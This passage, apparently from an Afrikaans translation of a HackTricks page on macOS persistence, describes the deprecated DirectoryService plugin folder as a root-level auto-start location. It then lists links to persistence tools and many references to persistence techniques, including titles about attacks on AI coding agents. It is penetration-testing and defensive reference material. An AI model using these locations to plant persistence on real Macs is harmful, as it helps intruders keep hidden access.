Skrywe: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Verouderde, voorwaardelike meganisme:** Root-toegang is nodig om dit te installeer, en die inprop moet werklik opgestel en gelaai word. DirectoryService se inprop-API is afgekeur; raadpleeg die teiken-Mac se Open Directory-konfigurasie voordat jy dit as ’n selflaaisneller beskou.

#### Ligging

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root-toegang benodig
  - **Sneller:** `dspluginhelperd` laai ’n geskikte, opgestelde inprop wanneer Open Directory dit benodig. [Apple se gids vir die inprop-looptydomgewing](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) sê dat inproppe wat nie vir aanvang opgestel is nie, luiweg gelaai kan word wanneer hul nodus oopgemaak word.

#### Beskrywing en uitbuiting

`dspluginhelperd` ondersteun verouderde DirectoryService-inpropbundels. ’n Kwaadwillige inprop kan ’n bevoorregte uitvoeringspad wees waar die verouderde inprop aanvaar en geaktiveer word; dit verskil van PAM en Authorization Plugins. Die feit dat die gids bestaan, bewys nie dat ’n nuutgeskrewe inprop met die volgende selflaai sal loop nie. Apple se plaaslike `dspluginhelperd(8)`- en `opendirectoryd(8)`-handleidings op macOS 26.5 lys steeds die helper en hierdie verouderde pad.<sup>[[53]](#references)</sup>

Leesalleen-waarneming op macOS 26: `/Library/DirectoryServices/PlugIns` en `/usr/libexec/dspluginhelperd` bestaan. Geen inprop is tydens hierdie toets geïnstalleer, opgestel of gelaai nie.

## Volhardingstegnieke en -nutsmiddels

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Verby die goeie ou LaunchAgents - 1 - shell-opstartlêers](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Verby die goeie ou LaunchAgents - 18 - X11 en XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Verby die goeie ou LaunchAgents - 21 - Heropende toepassings](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Verby die goeie ou LaunchAgents - 20 - Terminal-voorkeure](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Verby die goeie ou LaunchAgents - 13 - Oudio-inproppe](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit-inproppe (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Verby die goeie ou LaunchAgents - 12 - QuickLook-inproppe](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Verby die goeie ou LaunchAgents - 22 - LoginHook en LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Verby die goeie ou LaunchAgents - 4 - cron-take](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Verby die goeie ou LaunchAgents - 2 - iTerm2-aanvang](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Verby die goeie ou LaunchAgents - 7 - xbar-inproppe](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Verby die goeie ou LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Verby die goeie ou LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Verby die goeie ou LaunchAgents - 3 - Aanmelditems](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Verby die goeie ou LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Verby die goeie ou LaunchAgents - 24 - Gidsaksies](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Gidsaksies vir volharding op macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Verby die goeie ou LaunchAgents - 27 - Dock-kortpaaie](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Verby die goeie ou LaunchAgents - 17 - Kleurkiesers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Verby die goeie ou LaunchAgents - 26 - Finder Sync-inproppe](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Ontleding van “Mac File Opener”-volharding (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Verby die goeie ou LaunchAgents - 16 - Skermbewaarder](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Behou jou toegang: Skermbewaarders vir volharding op macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Verby die goeie ou LaunchAgents - 11 - Spotlight-invoerders](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Verby die goeie ou LaunchAgents - 9 - Voorkeurvenster](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Verby die goeie ou LaunchAgents - 19 - Periodieke skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Verby die goeie ou LaunchAgents - 5 - Inpropbare verifikasiemodules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Verby die goeie ou LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Volgehoue diefstal van aanmeldbewyse met Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Verby die goeie ou LaunchAgents - 30 - Die man-konfigurasielêer - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Verby die goeie ou LaunchAgents - 25 - Apache2-modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Verby die goeie ou LaunchAgents - 31 - BSM-ouditraamwerk](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Verby die goeie ou LaunchAgents - 23 - emond, die gebeurtenismonitordaemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Verby die goeie ou LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Verby die goeie ou LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Verby die goeie ou LaunchAgents - 10 - Toepassingskriplêers](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Verby die goeie ou LaunchAgents - 32 - Dock-teëlinproppe](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Verby die goeie ou LaunchAgents - 33 - Legstukke](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Verby die goeie ou LaunchAgents - 34 - launchd-selflaaitake](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Verby die goeie ou LaunchAgents - 35 - Volhard deur NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Gebruik e-pos vir volharding op OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Verdagte wysiging van Apple Mail-reël-Plist (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Kwaadwillige profiele - Een van die ernstigste bedreigings vir Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Die kuns van Mac-wanware Vol.1 - Hfst.0x2 Volharding (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Ontleding van CVE-2024-44243, ’n macOS SIP-omseiling deur kernuitbreidings (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE en API-token-eksfiltrasie deur Claude Code-projeklêers (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nuwe kwesbaarheid in GitHub Copilot en Cursor - Reëlêer-agterdeur (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Alternatiewe installasiemetodes (eksterne uitbreidings)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Verwyder ExtensionInstallForcelist in Chrome op Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Oor die skryf van Sudo-inproppe (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Afstanduitbuiting van Mac via pasgemaakte URL-skemas (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Twee macOS-volhardingstruuks wat inproppe misbruik (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL-minimale voorbeeld (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Ontleding van ’n Spotlight-gebaseerde macOS TCC-kwesbaarheid (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site`-module-dokumentasie (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
